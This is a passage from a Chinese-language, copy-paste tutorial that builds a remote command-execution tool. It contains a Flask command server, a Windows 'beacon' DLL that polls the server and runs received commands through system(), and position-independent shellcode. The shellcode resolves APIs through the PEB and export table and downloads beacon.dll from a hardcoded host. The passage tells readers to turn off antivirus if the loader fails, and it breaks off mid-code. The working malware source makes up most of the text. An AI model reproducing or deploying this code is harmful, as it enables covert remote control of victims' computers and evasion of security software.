+然后我们需要定义一个全局变量（供后续操作）,<code>g_cmd = ""</code>就是一个全局变量，可以理解为： “当前要执行的命令”,<code>return g_cmd</code>把我们输出的内容替换成这个变量,客户端拿到的就是真实命令</p>
+<pre><code>from flask import Flask
+app = Flask(__name__)
+g_cmd = &quot;&quot;
+@app.route('/api/v1/client/get_cmd', methods=['GET'])
+def client_get_cmd():
+    global g_cmd
+    return g_cmd
+@app.route(&quot;/&quot;)
+def root():
+    return '你好世界'
+if __name__ == &quot;__main__&quot;:
+    app.run(debug=True, host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p><img alt="如图" src="../image/55.png" />
+为什么这里必须用“全局变量”？</p>
+<p>因为：我们的程序有多个接口（函数）,它们之间需要“共享数据”,所以必须有一个所有函数都能访问的地方
+比如：</p>
+<pre><code>/send_cmd（设置命令）
+/get_cmd（获取命令）
+</code></pre>
+<p>这就是：全局变量</p>
+<h3 id="-_1">客户端执行结果 -&gt; 服务端</h3>
+<p>客户端执行完代码后,要给服务端发送回显代码,
+操作同上,只不过这次不能用get的方法,而要用post:
+为什么用 POST？
+我们看看get和post对比
+| GET | POST |
+| ------- | ------------ |
+| 放在 URL | 放在请求体body |
+| 长度有限 | 可以很大 |
+| 不适合复杂数据 | 适合 |</p>
+<p>回显有很多字符串不能在url显示，且url有显示的上限，所以我们选择用POST</p>
+<pre><code>g_respone = &quot;&quot;
+
+@app.route('/api/v1/server/get_respone', methods=['POST'])
+def server_get_respone():
+    global g_respone
+    g_respone = request.data.decode()
+    return &quot;1337&quot;
+</code></pre>
+<p><img alt="如图" src="../image/56.png" /></p>
+<h3 id="_18">服务端输入命令&amp;服务端获取回显</h3>
+<p>我们继续复制粘贴下面这托，跟第一步一样的做法：</p>
+<pre><code>@app.route('/api/v1/server/send_cmd', methods=['GET'])
+def client_send_cmd():
+    global g_cmd
+    g_cmd = request.args.get('key') + &quot;|&quot; + request.args.get('cmd')
+    return {'success': True, 'cmd': g_cmd}
+</code></pre>
+<p>这个接口是干嘛的？——让你通过浏览器（或前端页面）输入命令
+request.args.get('key')意思：从 URL 里取参数 key 的值
+等价于：</p>
+<pre><code>key = &quot;1111&quot;
+cmd = &quot;dir&quot;
+</code></pre>
+<p>return {'success': True, 'cmd': g_cmd}这里返回了json,因为我们后续要用js渲染一些东西.</p>
+<p>服务端获取回显（get_client_respone）</p>
+<pre><code>@app.route('/api/v1/server/get_client_respone', methods=['GET'])
+def server_get_client_respone():
+    global g_respone
+    return g_respone
+</code></pre>
+<h3 id="_19">测试</h3>
+<p>打开控制台输入python 你的py文件名.py，启动，如下图
+<img alt="如图" src="../image/57.png" />
+接着浏览器访问
+http://xxxxx（你的IP地址）:5000/api/v1/server/send_cmd?key=1111&amp;cmd=dir
+就可以看到：
+<img alt="如图" src="../image/58.png" /></p>
+<pre><code>{
+  &quot;cmd&quot;: &quot;1111|dir&quot;,
+  &quot;success&quot;: true
+}
+</code></pre>
+<p>然后继续访问http://xxxxxx:5000/api/v1/client/get_cmd
+就会返回你刚刚输入的命令和密钥
+<img alt="如图" src="../image/59.png" /></p>
+<pre><code>1111|dir
+</code></pre>
+<p>很好，到这里，你已经几乎要成功了！你做得很好！！！</p>
+<h2 id="_20">五、客户端的第一个指令</h2>
+<p>是时候把“客户端”真正接上之前写的 Flask 服务端了！</p>
+<p>插个题外话，或许你想问，为什么？为什么我们要这样干，为什么必须“客户端主动连接”？
+为什么不让服务端主动连客户端？
+因为现实中：你的电脑在内网（NAT）、没有公网IP、防火墙阻止外部连接
+服务端根本连不上你，所以！就得让客户端主动去问服务端（轮询）
+这就叫：反向连接 / 轮询模型</p>
+<p>ok，回到正题，干活之前，我们先捋清楚思路，列下需求：</p>
+<ol>
+<li>循环连接服务器（循环请求）</li>
+<li>校验服务端的密码（防止乱连）</li>
+<li>执行服务器下发的命令</li>
+<li>回显给服务端（把结果发回服务器）</li>
+</ol>
+<h3 id="_21">循环链接服务端</h3>
+<p>为了方便我们上手，这里使用winhttp作为链接工具.
+这里是一个简单的winhttp封装,只实现了get方法,没有使用post所以不能回显。
+继续复制粘贴吧</p>
+<pre><code>#define WINHTTP_STACK_LIMIT 64
+typedef struct _winhttp_url_custom_stack {
+    wchar_t szScheme[WINHTTP_STACK_LIMIT];
+    wchar_t szHostName[WINHTTP_STACK_LIMIT];
+    wchar_t szUserName[WINHTTP_STACK_LIMIT];
+    wchar_t szPassword[WINHTTP_STACK_LIMIT];
+    wchar_t szUrlPath[WINHTTP_STACK_LIMIT];
+    wchar_t szExtraInfo[WINHTTP_STACK_LIMIT];
+} _winhttp_url_custom_stack;
+
+namespace Winhttp {
+auto initParams(URL_COMPONENTS* urlParams,
+                _winhttp_url_custom_stack* inputParams) -&gt; void {
+    urlParams-&gt;dwStructSize = sizeof(URL_COMPONENTS);
+    urlParams-&gt;lpszExtraInfo = inputParams-&gt;szExtraInfo;
+    urlParams-&gt;lpszHostName = inputParams-&gt;szHostName;
+    urlParams-&gt;lpszPassword = inputParams-&gt;szPassword;
+    urlParams-&gt;lpszScheme = inputParams-&gt;szScheme;
+    urlParams-&gt;lpszUrlPath = inputParams-&gt;szUrlPath;
+    urlParams-&gt;lpszUserName = inputParams-&gt;szUserName;
+
+    urlParams-&gt;dwExtraInfoLength = urlParams-&gt;dwHostNameLength =
+        urlParams-&gt;dwPasswordLength = urlParams-&gt;dwSchemeLength =
+            urlParams-&gt;dwUrlPathLength = urlParams-&gt;dwUserNameLength =
+                WINHTTP_STACK_LIMIT;
+}
+auto Get(std::wstring url, void** outBuffer, size_t&amp; outBufferSize) -&gt; bool {
+    _winhttp_url_custom_stack winHttpStack = {0};
+    URL_COMPONENTS urlParams = {0};
+    HINTERNET httpSession = 0, httpConnectHandle = 0, httpRequest = 0;
+    initParams(&amp;urlParams, &amp;winHttpStack);
+    void* buffer = nullptr;
+    size_t bufferSize = 0;
+    size_t readSize = 0;
+    size_t realySize = 0;
+    bool status = false;
+    DWORD headBufferSize = sizeof(headBufferSize), headContextSize,
+          headIndex = 0;
+    do {
+        auto httpStatus =
+            WinHttpCrackUrl(url.c_str(), url.size(), ICU_DECODE, &amp;urlParams);
+        if (httpStatus == false) {
+            break;
+        }
+        httpSession =
+            WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
+        if (httpSession == 0) {
+            break;
+        }
+        httpConnectHandle = WinHttpConnect(httpSession, urlParams.lpszHostName,
+                                           urlParams.nPort, 0);
+        if (httpConnectHandle == 0) {
+            break;
+        }
+
+        httpRequest = WinHttpOpenRequest(
+            httpConnectHandle, L&quot;GET&quot;, urlParams.lpszUrlPath, L&quot;HTTP/1.1&quot;,
+            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
+            WINHTTP_FLAG_REFRESH);
+        if (httpRequest == 0) {
+            break;
+        }
+        if (WinHttpSendRequest(httpRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                               WINHTTP_NO_REQUEST_DATA, 0, 0, 0) == false) {
+            break;
+        }
+        if (WinHttpReceiveResponse(httpRequest, 0) == false) {
+            break;
+        }
+        if (WinHttpQueryDataAvailable(
+                httpRequest, reinterpret_cast&lt;LPDWORD&gt;(&amp;realySize)) == false) {
+            break;
+        }
+        buffer = malloc(realySize);
+        if (buffer == nullptr) {
+            break;
+        }
+        memset(buffer, 0, realySize);
+        bufferSize = realySize;
+        if (WinHttpReadData(httpRequest, buffer, realySize,
+                            reinterpret_cast&lt;LPDWORD&gt;(&amp;realySize)) == false) {
+            break;
+        }
+        status = true;
+    } while (false);
+    if (status) {
+        *outBuffer = buffer;
+        outBufferSize = bufferSize;
+    } else {
+        if (buffer != nullptr) {
+            free(buffer);
+        }
+    }
+    // close
+    if (httpRequest != 0) {
+        WinHttpCloseHandle(httpRequest);
+    }
+    if (httpConnectHandle != 0) {
+        WinHttpCloseHandle(httpConnectHandle);
+    }
+    if (httpSession != 0) {
+        WinHttpCloseHandle(httpSession);
+    }
+    return status;
+}
+}  // namespace Winhttp
+</code></pre>
+<p>上面这一大坨：WinHttpOpen → WinHttpConnect → WinHttpOpenRequest → Send → Receive → Read
+其实就是用 Windows 自带库实现 HTTP 请求</p>
+<p>复制粘贴完上面这一对代码后，会显示</p>
+<p><img alt="如图" src="../image/60.png" />
+在头部加上这面这一坨声明和链接库就能解决</p>
+<pre><code>#include &lt;Windows.h&gt;
+#include &lt;winhttp.h&gt;
+#include &lt;string&gt;
+#include &lt;vector&gt;
+#include &lt;random&gt;
+#pragma comment(lib, &quot;winhttp.lib&quot;)
+</code></pre>
+<p><img alt="如图" src="../image/61.png" /></p>
+<h4 id="_22">分析</h4>
+<p><strong>解析 URL</strong></p>
+<pre><code>WinHttpCrackUrl(...)
+</code></pre>
+<p><strong>打开会话</strong></p>
+<pre><code>WinHttpOpen(...)
+</code></pre>
+<p><strong>连接服务器</strong></p>
+<pre><code>WinHttpConnect(...)
+</code></pre>
+<p><strong>创建请求</strong>
+发 GET 请求</p>
+<pre><code>WinHttpOpenRequest(...)
+</code></pre>
+<p><strong>发送请求</strong>
+把请求发出去</p>
+<pre><code>WinHttpSendRequest(...)
+</code></pre>
+<p><strong>接收响应</strong></p>
+<pre><code>WinHttpReceiveResponse(...)
+</code></pre>
+<p><strong>读取数据</strong>
+把服务器返回的内容读出来</p>
+<pre><code>WinHttpReadData(...)
+</code></pre>
+<p>为什么要用malloc？</p>
+<pre><code>buffer = malloc(realySize);
+</code></pre>
+<p>因为我们不知道服务器返回多大数据,必须先问大小、再申请内存、再读取</p>
+<p>要注意的是不能在 DLL_PROCESS_ATTACH 直接用 WinHTTP，否则会造成死锁！AI说是因为DLL 加载时，Windows正在加载各种系统库处于“锁定状态”，而 WinHTTP也会加载 DLL，也会用锁，这样他俩就互相等，就造成了死锁
+所以我们要新建一个线程启动，而在shellcode中不存在这个问题
+复制粘贴下面这坨代码</p>
+<pre><code>auto easyCreateThread(void* pFunctionAddress, void* pParams) -&gt; HANDLE {
+    return CreateThread(
+        NULL, NULL, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(pFunctionAddress),
+        static_cast&lt;LPVOID&gt;(pParams), NULL, NULL);
+}
+auto Work() -&gt; void {
+    easyCreateThread(reinterpret_cast&lt;void*&gt;(loopWork), nullptr);
+}
+</code></pre>
+<p><strong>循环请求服务端等待消息</strong>
+在线程启动后,我们需要循环请求服务端的消息,为了避免快速请求导致服务器炸掉,所以我们加上slepep会每1秒请求一次。
+此外,为了安全与合法,我们需要在客户端生成随机字符串作为key，只有服务端的key和客户端key对的上才能链接——即，只有在客户端同意的情况下，服务端才能链接上客户端</p>
+<pre><code>namespace Auth {
+std::string localKey;
+auto strRand(int length) -&gt; std::string {
+    char tmp;
+    std::string buffer;
+    std::random_device rd;
+    std::default_random_engine random(rd());
+    for (int i = 0; i &lt; length; i++) {
+        tmp = random() % 36;
+        if (tmp &lt; 10) {
+            tmp += '0';
+        } else {
+            tmp -= 10;
+            tmp += 'A';
+        }
+        buffer += tmp;
+    }
+    return buffer;
+}
+bool CheckPassword(std::string key) { return key == localKey; }
+void Init() { localKey = strRand(6); }
+}  // namespace Auth
+</code></pre>
+<p>每个客户端生成一个6位密码<code>localKey = strRand(6);</code></p>
+<p>和之前的组合在一起，下面的地址要改成你自己的IP地址
+http://xxxxx（你自己的IP地址）/api/v1/client/get_cmd</p>
+<pre><code>    namespace Beacon {
+    void loopWork() {
+        static const std::wstring cmdUrl =
+            L&quot;http://192.168.1:5000/api/v1/client/get_cmd&quot;;
+        Auth::Init();
+        printf(&quot;你的本地密钥是: %s 请不要随便分享给其他人/n&quot;,
+            Auth::localKey.c_str());
+        do {
+            void* buffer = nullptr;
+            size_t bufferSize = 0;
+
+            bool status = Winhttp::Get(cmdUrl, &amp;buffer, bufferSize);
+            if (status &amp;&amp; buffer != nullptr) {
+                std::string serverCmd =
+                    std::string(reinterpret_cast&lt;char*&gt;(buffer), bufferSize);
+                if (serverCmd.size() &gt; 0) {
+                    std::string key = serverCmd.substr(0, 6);
+                    if (Auth::CheckPassword(key)) {
+                        std::string cmd = serverCmd.substr(7, serverCmd.size());
+                        printf(&quot;cmd: %s /n&quot;, cmd.c_str());
+                        system(cmd.c_str());
+                    }
+                }
+                free(buffer);
+            }
+            Sleep(1000);
+        } while (true);
+    }
+</code></pre>
+<p>启动beacon
+把原来的</p>
+<pre><code>BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, &quot;hello i am beacon&quot;, NULL, NULL);
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>改为</p>
+<pre><code>BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
+    LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        Beacon::Work();
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p><img alt="如图" src="../image/63.png" />
+beacon写好后保存生成方案</p>
+<p><img alt="如图" src="../image/64.png" />
+打开hfs，在网页上传新的beacon.dll并保存</p>
+<p>这一切工作做好后，运行shellcode-2，（如果运行不了就关掉杀毒软件再运行）可以看到生成的密码
+<img alt="如图" src="../image/62.png" />
+http://192.168.1.5:5000/api/v1/server/send_cmd?key=7IXPFE&amp;cmd=duck
+<img alt="如图" src="../image/66.png" /></p>
+<p>访问
+http://127.0.0.1:5000/api/v1/client/get_cmd
+应该会返回刚刚输入的命令和密钥
+<img alt="如图" src="../image/65.png" />
+坚持到这里的你做到了！！</p>
+<hr />
+<p>以下是shellcode、beacon.dll、main.py的完整代码：</p>
+<p>shellcode的完整代码如下：</p>
+<pre><code>// shellcode-2.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。
+//
+
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#include &lt;Winhttp.h&gt;
+#define DEREF( name )*(UINT_PTR *)(name)
+#define DEREF_64( name )*(unsigned __int64 *)(name)
+#define DEREF_32( name )*(unsigned long *)(name)
+#define DEREF_16( name )*(unsigned short *)(name)
+#define DEREF_8( name )*(UCHAR *)(name)
+typedef struct _UNICODE_STR
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR pBuffer;
+} UNICODE_STR, * PUNICODE_STR;
+
+// WinDbg&gt; dt -v ntdll!_PEB_LDR_DATA
+typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
+{
+    DWORD dwLength;
+    DWORD dwInitialized;
+    LPVOID lpSsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    LPVOID lpEntryInProgress;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+// WinDbg&gt; dt -v ntdll!_PEB_FREE_BLOCK
+typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
+{
+    struct _PEB_FREE_BLOCK* pNext;
+    DWORD dwSize;
+} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
+
+
+// struct _PEB is defined in Winternl.h but it is incomplete
+// WinDbg&gt; dt -v ntdll!_PEB
+typedef struct __PEB // 65 elements, 0x210 bytes
+{
+    BYTE bInheritedAddressSpace;
+    BYTE bReadImageFileExecOptions;
+    BYTE bBeingDebugged;
+    BYTE bSpareBool;
+    LPVOID lpMutant;
+    LPVOID lpImageBaseAddress;
+    PPEB_LDR_DATA pLdr;
+    LPVOID lpProcessParameters;
+    LPVOID lpSubSystemData;
+    LPVOID lpProcessHeap;
+    PRTL_CRITICAL_SECTION pFastPebLock;
+    LPVOID lpFastPebLockRoutine;
+    LPVOID lpFastPebUnlockRoutine;
+    DWORD dwEnvironmentUpdateCount;
+    LPVOID lpKernelCallbackTable;
+    DWORD dwSystemReserved;
+    DWORD dwAtlThunkSListPtr32;
+    PPEB_FREE_BLOCK pFreeList;
+    DWORD dwTlsExpansionCounter;
+    LPVOID lpTlsBitmap;
+    DWORD dwTlsBitmapBits[2];
+    LPVOID lpReadOnlySharedMemoryBase;
+    LPVOID lpReadOnlySharedMemoryHeap;
+    LPVOID lpReadOnlyStaticServerData;
+    LPVOID lpAnsiCodePageData;
+    LPVOID lpOemCodePageData;
+    LPVOID lpUnicodeCaseTableData;
+    DWORD dwNumberOfProcessors;
+    DWORD dwNtGlobalFlag;
+    LARGE_INTEGER liCriticalSectionTimeout;
+    DWORD dwHeapSegmentReserve;
+    DWORD dwHeapSegmentCommit;
+    DWORD dwHeapDeCommitTotalFreeThreshold;
+    DWORD dwHeapDeCommitFreeBlockThreshold;
+    DWORD dwNumberOfHeaps;
+    DWORD dwMaximumNumberOfHeaps;
+    LPVOID lpProcessHeaps;
+    LPVOID lpGdiSharedHandleTable;
+    LPVOID lpProcessStarterHelper;
+    DWORD dwGdiDCAttributeList;
+    LPVOID lpLoaderLock;
+    DWORD dwOSMajorVersion;
+    DWORD dwOSMinorVersion;
+    WORD wOSBuildNumber;
+    WORD wOSCSDVersion;
+    DWORD dwOSPlatformId;
+    DWORD dwImageSubsystem;
+    DWORD dwImageSubsystemMajorVersion;
+    DWORD dwImageSubsystemMinorVersion;
+    DWORD dwImageProcessAffinityMask;
+    DWORD dwGdiHandleBuffer[34];
+    LPVOID lpPostProcessInitRoutine;
+    LPVOID lpTlsExpansionBitmap;
+    DWORD dwTlsExpansionBitmapBits[32];
+    DWORD dwSessionId;
+    ULARGE_INTEGER liAppCompatFlags;
+    ULARGE_INTEGER liAppCompatFlagsUser;
+    LPVOID lppShimData;
+    LPVOID lpAppCompatInfo;
+    UNICODE_STR usCSDVersion;
+    LPVOID lpActivationContextData;
+    LPVOID lpProcessAssemblyStorageMap;
+    LPVOID lpSystemDefaultActivationContextData;
+    LPVOID lpSystemAssemblyStorageMap;
+    DWORD dwMinimumStackCommit;
+} _PEB;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    //LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA-&gt;InMemoryOrderModuleList we dont use the first entry.
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STR FullDllName;
+    UNICODE_STR BaseDllName;
+    ULONG Flags;
+    SHORT LoadCount;
+    SHORT TlsIndex;
+    LIST_ENTRY HashTableEntry;
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+void shellcode_start() {
+    //代码不用理解,可以直接复制粘贴.
+    uint64_t base_address = NULL;
+    //0.读取fs,找到peb
+    base_address = __readfsdword(0x30);
+    unsigned short m_counter;
+    uint64_t ldr_table;
+    uint64_t dll_name;
+    uint64_t hash_name;
+    uint64_t kernel32_base = 0;
+
+    base_address = (uint64_t)((_PEB*)base_address)-&gt;pLdr;
+    ldr_table =
+        (uint64_t)((PPEB_LDR_DATA)base_address)-&gt;InMemoryOrderModuleList.Flink;
+    //1. 通过peb里面的LDR找到kernel32的地址
+    while (ldr_table) {
+        dll_name =
+            (uint64_t)((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;BaseDllName.pBuffer;
+        m_counter = ((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;BaseDllName.Length;
+        hash_name = 0;
+        do {
+            hash_name = _rotr((unsigned long)hash_name, 13);
+            if (*((unsigned char*)dll_name) &gt;= 'a')
+                hash_name += *((unsigned char*)dll_name) - 0x20;
+            else
+                hash_name += *((unsigned char*)dll_name);
+            dll_name++;
+        } while (--m_counter);
+        //hash name其实是基于dll_name的因为我们也不想取到其他的莫名其妙的东西,做个简单地hash会准确很多
+        //如果你不想用hashname,那么你可以printf(&quot;%wZ&quot;,dll_name);观察一下dll name自己想一下新的思路
+        if ((unsigned long)hash_name == 0x6A4ABC5B) {
+            //这就是kernel.dll的地址了
+            kernel32_base = (uint64_t)((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;DllBase;
+            break;
+        }
+        ldr_table = DEREF(ldr_table);
+        if (kernel32_base != 0) {
+            //找到了退出
+            break;
+        }
+    }
+    if (kernel32_base == 0) {
+        __debugbreak();
+    }
+    typedef HMODULE(WINAPI* GetProcAddressT)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
+    typedef HMODULE(WINAPI* LoadLibraryAT)(_In_ LPCSTR lpLibFileName);
+    GetProcAddressT fnGetProcAddress = NULL;
+    LoadLibraryAT fnLoadlibrary = NULL;
+
+    //别在意这边的大小写驼峰混乱,因为是两套代码拼接的,懒得改了....
+    UINT_PTR uiAddressArray = NULL;
+    UINT_PTR uiNameArray = NULL;
+    UINT_PTR uiNameOrdinals = NULL;
+    PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
+    PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;
+    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
+    // 解析PE头
+    pNtHeaders32 = (PIMAGE_NT_HEADERS32)(kernel32_base + ((PIMAGE_DOS_HEADER)kernel32_base)-&gt;e_lfanew);
+    pNtHeaders64 = (PIMAGE_NT_HEADERS64)(kernel32_base + ((PIMAGE_DOS_HEADER)kernel32_base)-&gt;e_lfanew);
+    // 拿到导出表
+    pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    // 遍历导出表
+    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(kernel32_base + pDataDirectory-&gt;VirtualAddress);
+    uiAddressArray = (kernel32_base + pExportDirectory-&gt;AddressOfFunctions);
+    uiNameArray = (kernel32_base + pExportDirectory-&gt;AddressOfNames);
+    uiNameOrdinals = (kernel32_base + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+    unsigned long dwCounter = pExportDirectory-&gt;NumberOfNames;
+
+    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '/0' };
+    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','/0' };
+    while (dwCounter--)
+    {
+        char* cpExportedFunctionName = (char*)(kernel32_base + DEREF_32(uiNameArray));
+        char* matchPtr = &amp;str1[0];
+        int ret = 0;
+        while (!(ret = *cpExportedFunctionName - *matchPtr) &amp;&amp; *cpExportedFunctionName)
+        {
+            cpExportedFunctionName++;
+            matchPtr++;
+        }
+        if (ret == 0)
+        {
+            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+            fnGetProcAddress = (GetProcAddressT)(kernel32_base + DEREF_32(uiAddressArray));
+        }
+        else {
+            cpExportedFunctionName = (char*)(kernel32_base + DEREF_32(uiNameArray));
+            char* matchPtr = &amp;str2[0];
+            ret = 0;
+            while (!(ret = *cpExportedFunctionName - *matchPtr) &amp;&amp; *cpExportedFunctionName)
+            {
+                cpExportedFunctionName++;
+                matchPtr++;
+            }
+            if (ret == 0)
+            {
+                uiAddressArray = (kernel32_base + pExportDirectory-&gt;AddressOfFunctions);
+                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+                fnLoadlibrary = (LoadLibraryAT)(kernel32_base + DEREF_32(uiAddressArray));
+            }
+        }
+        if (fnLoadlibrary &amp;&amp; fnGetProcAddress) {
+            break;
+        }
+        uiNameArray += sizeof(unsigned long);
+        uiNameOrdinals += sizeof(unsigned short);
+    }
+    if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
+        __debugbreak();
+    }
+
+
+
+    typedef struct _URL_INFO
+    {
+        WCHAR szScheme[36];
+        WCHAR szHostName[36];
+        WCHAR szUserName[36];
+        WCHAR szPassword[36];
+        WCHAR szUrlPath[36];
+        WCHAR szExtraInfo[36];
+    }URL_INFO, * PURL_INFO;
+
+    _URL_INFO url;
+    URL_COMPONENTSW lpUrlComponents;
+    lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
+    lpUrlComponents.lpszExtraInfo = url.szExtraInfo;
+    lpUrlComponents.lpszHostName = url.szHostName;
+    lpUrlComponents.lpszPassword = url.szPassword;
+    lpUrlComponents.lpszScheme = url.szScheme;
+    lpUrlComponents.lpszUrlPath = url.szUrlPath;
+    lpUrlComponents.lpszUserName = url.szUserName;
+
+    lpUrlComponents.dwExtraInfoLength =
+        lpUrlComponents.dwHostNameLength =
+        lpUrlComponents.dwPasswordLength =
+        lpUrlComponents.dwSchemeLength =
+        lpUrlComponents.dwUrlPathLength =
+        lpUrlComponents.dwUserNameLength = 36;
+
+    typedef HMODULE(WINAPI* WinHttpCrackUrlT)(_In_reads_(dwUrlLength) LPCWSTR pwszUrl, _In_ DWORD dwUrlLength, _In_ DWORD dwFlags, _Inout_ LPURL_COMPONENTS lpUrlComponents);
+    typedef HINTERNET(WINAPI* WinHttpOpenT)(_In_opt_z_ LPCWSTR pszAgentW,
+        _In_ DWORD dwAccessType,
+        _In_opt_z_ LPCWSTR pszProxyW,
+        _In_opt_z_ LPCWSTR pszProxyBypassW,
+        _In_ DWORD dwFlags);
+    typedef HINTERNET(WINAPI* WinHttpConnectT)(
+        IN HINTERNET hSession,
+        IN LPCWSTR pswzServerName,
+        IN INTERNET_PORT nServerPort,
+        IN DWORD dwReserved);
+    typedef HINTERNET(WINAPI* WinHttpOpenRequestT)(
+        IN HINTERNET hConnect,
+        IN LPCWSTR pwszVerb,
+        IN LPCWSTR pwszObjectName,
+        IN LPCWSTR pwszVersion,
+        IN LPCWSTR pwszReferrer OPTIONAL,
+        IN LPCWSTR FAR* ppwszAcceptTypes OPTIONAL,
+        IN DWORD dwFlags);
+    typedef BOOL(WINAPI* WinHttpSendRequestT)(
+        IN HINTERNET hRequest,
+        _In_reads_opt_(dwHeadersLength) LPCWSTR lpszHeaders,
+        IN DWORD dwHeadersLength,
+        _In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
+        IN DWORD dwOptionalLength,
+        IN DWORD dwTotalLength,
+        IN DWORD_PTR dwContext);
+    typedef BOOL(WINAPI* WinHttpReceiveResponseT)(
+        IN HINTERNET hRequest,
+        IN LPVOID lpReserved);
+    typedef BOOL(WINAPI* WinHttpQueryHeadersT)(
+        IN     HINTERNET hRequest,
+        IN     DWORD     dwInfoLevel,
+        IN     LPCWSTR   pwszName OPTIONAL,
+        _Out_writes_bytes_to_opt_(*lpdwBufferLength, *lpdwBufferLength) __out_data_source(NETWORK) LPVOID lpBuffer,
+        IN OUT LPDWORD   lpdwBufferLength,
+        IN OUT LPDWORD   lpdwIndex OPTIONAL);
+    typedef BOOL(WINAPI* WinHttpCloseHandleT)(
+        IN HINTERNET hInternet);
+    typedef void* (WINAPI* mallocT)(size_t);
+    typedef BOOL(WINAPI* WinHttpReadDataT)(
+        IN HINTERNET hRequest,
+        _Out_writes_bytes_to_(dwNumberOfBytesToRead, *lpdwNumberOfBytesRead) __out_data_source(NETWORK) LPVOID lpBuffer,
+        IN DWORD dwNumberOfBytesToRead,
+        OUT LPDWORD lpdwNumberOfBytesRead);
+    typedef void* (WINAPI* memcpyT)(
+        _Out_writes_bytes_all_(_Size) void* _Dst,
+        _In_reads_bytes_(_Size)       void const* _Src,
+        _In_                          size_t      _Size);
+    void* pBuffer = nullptr;
+    constexpr char strWinHttpCrackUrl[] = &quot;WinHttpCrackUrl&quot;;
+    constexpr char strWinHttpOpen[] = &quot;WinHttpOpen&quot;;
+    constexpr char strWinHttpConnect[] = &quot;WinHttpConnect&quot;;
+    constexpr char strWinHttpOpenRequest[] = &quot;WinHttpOpenRequest&quot;;
+    constexpr char strWinHttpSendRequest[] = &quot;WinHttpSendRequest&quot;;
+    constexpr char strWinHttpReceiveResponse[] = &quot;WinHttpReceiveResponse&quot;;
+    constexpr char strWinHttpQueryHeaders[] = &quot;WinHttpQueryHeaders&quot;;
+    constexpr char strWinHttpCloseHandle[] = &quot;WinHttpCloseHandle&quot;;
+    constexpr char strWinHttpReadData[] = &quot;WinHttpReadData&quot;;
+    constexpr char strMemcpy[] = &quot;memcpy&quot;;
+    constexpr char strWinhttp[] = &quot;Winhttp.dll&quot;;
+    constexpr wchar_t strUrl[] = L&quot;http://192.168.1.5/beacon.dll&quot;;
+    constexpr wchar_t strHead[] = L&quot;HEAD&quot;;
+    constexpr wchar_t strHTTP[] = L&quot;HTTP/1.1&quot;;
+    constexpr wchar_t strGet[] = L&quot;GET&quot;;
+    constexpr char strMalloc[] = &quot;malloc&quot;;
+    constexpr char strMsvcrt[] = &quot;msvcrt.dll&quot;;
+    WinHttpCrackUrlT fnWinHttpCrackUrl = (WinHttpCrackUrlT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpCrackUrl);
+    WinHttpOpenT fnWinHttpOpen = (WinHttpOpenT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpOpen);
+    WinHttpConnectT fnWinHttpConnect = (WinHttpConnectT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpConnect);
+    WinHttpOpenRequestT fnWinHttpOpenRequest = (WinHttpOpenRequestT)fnGetProcAddress(fnLoadlibrary(strWinhttp), (char*)strWinHttpOpenRequest);
